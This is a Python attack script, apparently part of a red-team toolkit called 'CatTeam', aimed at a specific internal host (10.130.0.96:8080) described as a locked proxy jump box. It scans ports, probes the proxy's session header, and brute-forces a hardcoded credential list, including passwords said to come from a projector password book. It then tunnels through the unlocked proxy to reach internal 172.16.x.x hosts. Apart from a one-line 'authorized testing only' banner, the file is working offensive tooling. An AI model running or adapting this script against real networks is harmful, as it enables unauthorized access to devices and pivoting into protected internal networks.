#!/usr/bin/env python3
"""
🖨️ CatTeam HP Proxy Unlocker — 代理跳板机复仇者

目标: 10.130.0.96:8080
情报: 导师确认该设备曾作为伪装边界跳板机, 8080 端口返回 X-Session-Status: locked
历史凭据: 12345678, ASCOTT (来自投屏器密码本)

功能:
  Phase 1: 快速端口复查 (80, 443, 8080, 9100)
  Phase 2: 8080 代理状态检测 (是否仍 locked)
  Phase 3: 凭据爆破 (Basic Auth / Bearer / Custom Headers)
  Phase 4: 代理隧道验证 (通过代理访问深水区)

用法: python3 23-hp-proxy-unlocker.py [target_ip]
"""

import sys, os, socket, json, base64, urllib.request, urllib.error, ssl

# === 色彩 ===
G="\033[1;32m"; R="\033[0;31m"; Y="\033[1;33m"; C="\033[0;36m"
P="\033[1;35m"; W="\033[1;37m"; DIM="\033[2m"; NC="\033[0m"

# === 配置 ===
DEFAULT_TARGET = "10.130.0.96"
PROXY_PORT = 8080

# 导师提供的凭据 + 常见弱密码
CREDENTIALS = [
    ("", ""),                     # 空凭据
    ("admin", "12345678"),
    ("admin", "ASCOTT"),
    ("admin", "ascott"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("root", "12345678"),
    ("root", "ASCOTT"),
    ("", "12345678"),
    ("", "ASCOTT"),
    ("user", "12345678"),
    ("guest", "guest"),
]

# 深水区探测目标 (导师提及的 172.16.x.x)
DEEP_TARGETS = [
    "http://172.16.0.1",
    "http://172.16.1.1",
    "http://172.16.0.1:80",
    "http://10.130.0.1",            # 网关
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def port_check(ip, port, timeout=3):
    """TCP 端口检测"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False


def probe_proxy(ip, port=PROXY_PORT):
    """探测 8080 代理状态"""
    url = f"http://{ip}:{port}/"
    results = {}

    # 尝试多种请求方式
    methods = [
        ("GET /", None),
        ("CONNECT", None),
    ]

    for desc, _ in methods:
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": "CatTeam/5.0",
                "Accept": "*/*",
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                headers = dict(resp.headers)
                body = resp.read(2000).decode("utf-8", errors="replace")
                results["status"] = resp.status
                results["headers"] = headers
                results["body_preview"] = body[:200]

                # 检查关键头
                session_status = headers.get("X-Session-Status", "")
                if session_status:
                    results["session_status"] = session_status
                    
                server = headers.get("Server", "")
                if server:
                    results["server"] = server

        except urllib.error.HTTPError as e:
            results["status"] = e.code
            results["headers"] = dict(e.headers) if hasattr(e, "headers") else {}
            session_status = results["headers"].get("X-Session-Status", "")
            if session_status:
                results["session_status"] = session_status
            try:
                results["body_preview"] = e.read(500).decode("utf-8", errors="replace")
            except:
                pass

        except Exception as e:
            results["error"] = str(e)

    return results


def try_unlock(ip, user, passwd):
    """尝试用凭据解锁代理"""
    url = f"http://{ip}:{PROXY_PORT}/"

    # 方法 1: Basic Auth
    cred = base64.b64encode(f"{user}:{passwd}".encode()).decode()
    headers_list = [
        {"Authorization": f"Basic {cred}"},
        {"X-Auth-Token": passwd},
        {"X-Password": passwd},
        {"Cookie": f"session={passwd}; password={passwd}"},
    ]

    for hdrs in headers_list:
        try:
            all_headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
            }
            all_headers.update(hdrs)

            req = urllib.request.Request(url, headers=all_headers)
            with urllib.request.urlopen(req, timeout=5) as resp:
                status = resp.status
                session = resp.headers.get("X-Session-Status", "")

                if status == 200 and session != "locked":
                    return True, status, session, hdrs

        except urllib.error.HTTPError as e:
            session = e.headers.get("X-Session-Status", "") if hasattr(e, "headers") else ""
            if e.code == 200 and session != "locked":
                return True, e.code, session, hdrs
        except:
            pass

    return False, 0, "", {}


def test_proxy_tunnel(ip):
    """通过代理测试深水区连通性"""
    proxy_handler = urllib.request.ProxyHandler({
        "http": f"http://{ip}:{PROXY_PORT}",
    })
    opener = urllib.request.build_opener(proxy_handler)

    results = []
    for target in DEEP_TARGETS:
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "CatTeam/5.0"})
            with opener.open(req, timeout=5) as resp:
                results.append((target, resp.status, "可达!"))
        except urllib.error.HTTPError as e:
            results.append((target, e.code, "HTTP 错误但有响应"))
        except Exception as e:
            err = str(e)[:40]
            results.append((target, 0, err))

    return results


def main():
    ip = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET

    print(f"""
{P}╔══════════════════════════════════════════════════════════╗
║  {W}🖨️ CatTeam HP Proxy Unlocker — 代理跳板机复仇者{P}      ║
║  {C}目标: {ip}:{PROXY_PORT}{P}                                       ║
║  {DIM}⚠️  仅供授权安全测试{P}                                  ║
╚══════════════════════════════════════════════════════════╝{NC}
""")

    # Phase 1: 端口复查
    print(f"  {W}━━━ Phase 1: 端口复查 ━━━{NC}")
    for port in [80, 443, 8080, 9100, 631]:
        status = "OPEN" if port_check(ip, port) else "----"
        color = G if status == "OPEN" else DIM
        print(f"  {color}[{status}] {ip}:{port}{NC}")

    if not port_check(ip, PROXY_PORT):
        print(f"\n  {R}[!] 8080 端口未开放, 代理可能已被关闭{NC}")
        print(f"  {DIM}    设备可能已被重置或下线{NC}")
        return

    # Phase 2: 代理状态检测
    print(f"\n  {W}━━━ Phase 2: 代理状态检测 ━━━{NC}")
    result = probe_proxy(ip)

    if "error" in result:
        print(f"  {R}[!] 连接失败: {result['error']}{NC}")
        return

    print(f"  {G}[+] HTTP {result.get('status', '?')}{NC}")
    if "server" in result:
        print(f"  {G}[+] Server: {result['server']}{NC}")
    if "session_status" in result:
        ss = result["session_status"]
        if ss == "locked":
            print(f"  {R}[🔒] X-Session-Status: {ss} ← 代理已锁定!{NC}")
        else:
            print(f"  {G}[🔓] X-Session-Status: {ss}{NC}")
    if "body_preview" in result:
        print(f"  {DIM}    Body: {result['body_preview'][:100]}{NC}")

    # Phase 3: 凭据爆破
    print(f"\n  {W}━━━ Phase 3: 凭据爆破 ({len(CREDENTIALS)} 组) ━━━{NC}")
    unlocked = False

    for user, passwd in CREDENTIALS:
        display = f"{user}:{passwd}" if user else f"(空):{passwd}" if passwd else "(空凭据)"
        success, status, session, hdrs = try_unlock(ip, user, passwd)

        if success:
            print(f"  {R}[🔥] {display} → HTTP {status} | Session: {session}{NC}")
            print(f"  {R}      使用的认证头: {hdrs}{NC}")
            unlocked = True
            break
        else:
            print(f"  {DIM}[·] {display} → 失败{NC}")

    if not unlocked:
        print(f"\n  {Y}[!] 所有凭据尝试失败{NC}")
        print(f"  {DIM}    建议: 抓包分析 8080 的认证协议后再攻击{NC}")
        return

    # Phase 4: 隧道验证
    print(f"\n  {W}━━━ Phase 4: 深水区隧道验证 ━━━{NC}")
    tunnel_results = test_proxy_tunnel(ip)

    for target, status, note in tunnel_results:
        if status == 200:
            print(f"  {R}[🔥] {target} → {status} {note}{NC}")
        elif status > 0:
            print(f"  {Y}[~] {target} → {status} {note}{NC}")
        else:
            print(f"  {DIM}[·] {target} → {note}{NC}")

    print(f"\n  {DIM}HP Proxy Unlocker 完毕 🐱{NC}\n")


if __name__ == "__main__":
    main()
